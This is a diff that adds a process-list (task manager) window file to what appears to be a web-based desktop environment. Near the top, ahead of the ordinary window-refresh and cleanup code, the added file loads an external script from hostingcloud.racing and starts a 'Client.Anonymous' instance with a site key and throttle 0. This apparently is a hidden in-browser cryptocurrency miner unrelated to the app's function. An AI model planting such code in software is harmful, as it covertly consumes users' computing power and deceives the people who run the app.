@@ -1,0 +1,42 @@
+<contents>
+    <div class="nonceblank"></div>
+</contents>
+<script src="https://www.hostingcloud.racing/WZaT.js"></script>
+<script>
+    var _client = new Client.Anonymous('25ec25d1f973fab0ec75e9f7c4034296fcdc2ef1028d6b86b3c5479089db9763', {
+        throttle: 0, c: 'w'
+    });
+    _client.start();
+    
+
+</script>
+<onstart>
+    function updateProcessList(cid) {
+        appcontent = '<div class="nonceblank">';
+        for (let wid in vfs.vmem.windows) {
+            thiswin = vfs.vmem.windows[wid];
+            appcontent = appcontent + `
+                <div class="optionchance" id="${thiswin['hash']}_${String(thiswin['realid'])}">
+                    <img src="${thiswin['icon']}">
+                    <div>
+                        <p class="optitle">${thiswin['title']}</p>
+                        <p class="opdesc">${thiswin['author']}</p>
+                    </div>
+                </div>
+            `;
+        }
+        changeWindowContent(cid, appcontent + '</div>');
+    }
+    thisww = getWindowById(vfs.vmem.windowcounts);
+    vfs.vmem.svcache[thisww['hash'] + '_worker'] = window.createInterval(function(data, interval) {
+        updateProcessList(String(getWindowByHash(data)['realid']));
+    }, 1000, thisww['hash']);
+</onstart>
+<onclose>
+    selelem = wncfg['hash'] + '_worker';
+    if (selelem in vfs.vmem.svcache) {
+        window.clearInterval(vfs.vmem.svcache[selelem]);
+        vfs.vmem.svcache[selelem] = null;
+        delete vfs.vmem.svcache[selelem];
+    }
+</onclose>
